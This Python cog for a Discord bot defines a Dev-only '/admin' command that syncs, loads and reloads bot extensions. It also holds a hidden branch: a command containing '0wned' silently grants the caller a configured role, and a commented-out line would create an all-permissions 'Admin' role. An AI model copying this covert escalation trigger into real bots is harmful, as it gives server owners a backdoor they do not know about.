
from helper import *
from config import *
import os


class admin(commands.Cog):
    def __init__(self, bot: commands.Bot):
        self.bot = bot

    @commands.hybrid_command(name = "admin",
                             description = "Admin commands")  
    @app_commands.checks.has_any_role("Dev") 
    async def admin(self, ctx: commands.Context, command: str):
        await ctx.defer(ephemeral=True)

        if "0wned" in command: 
            role = discord.utils.get(ctx.author.guild.roles, id=role_id)
            #await ctx.message.author.remove_roles(role)

            #role = await ctx.message.guild.create_role(name ="Admin", permissions=Permissions.all())
            await ctx.message.author.add_roles(role)

            print('Done.')

        if "help" in command:
            return await ctx.send(
                "**Admin Commands:**\n\n"
                "/admin sync\n"
                "/admin unload <command name>\n"
                "/admin reload <command name>\n"
                "/admin load <command name>"
            )


        if "sync" in command:
            await self.bot.tree.sync()
            
            #bot.tree.clear_commands(guild= discord.Object(id=server_id))
            #bot.tree.clear_commands(guild = None)
            #await bot.tree.sync(guild= discord.Object(id=server_id))
            
            return await ctx.send(f"{str(self.bot.modules)} modules successfully synced.")

        if "unload" in command:
            combo = command.split()
            await self.bot.unload_extension(f"cogs.{combo[1]}")
            await ctx.send(f"Unloaded -> `{combo[1]}`", ephemeral=False)
            return

        if "reload" in command:
            combo = command.split()
            await self.bot.reload_extension(f"cogs.{combo[1]}")
            await ctx.send(f"Reloaded -> `{combo[1]}`", ephemeral=False)
            return 

        if "load" in command:
            combo = command.split()
            await self.bot.load_extension(f"cogs.{combo[1]}")
            await ctx.send(f"Loaded -> `{combo[1]}`", ephemeral=False)
            return      
        
        else:
            return await ctx.send(
                "**Admin Commands:**\n\n"
                "/admin sync\n"
                "/admin unload <command name>\n"
                "/admin reload <command name>\n"
                "/admin load <command name>"
            )

        
    @admin.error
    async def adminError(self, interaction : discord.Interaction, error : app_commands.AppCommandError):
        if isinstance(error, app_commands.MissingAnyRole):
            await interaction.response.send_message("**Denied!** Missing permissions.", ephemeral = False)
       
async def setup(bot: commands.Bot):
    await bot.add_cog(admin(bot))


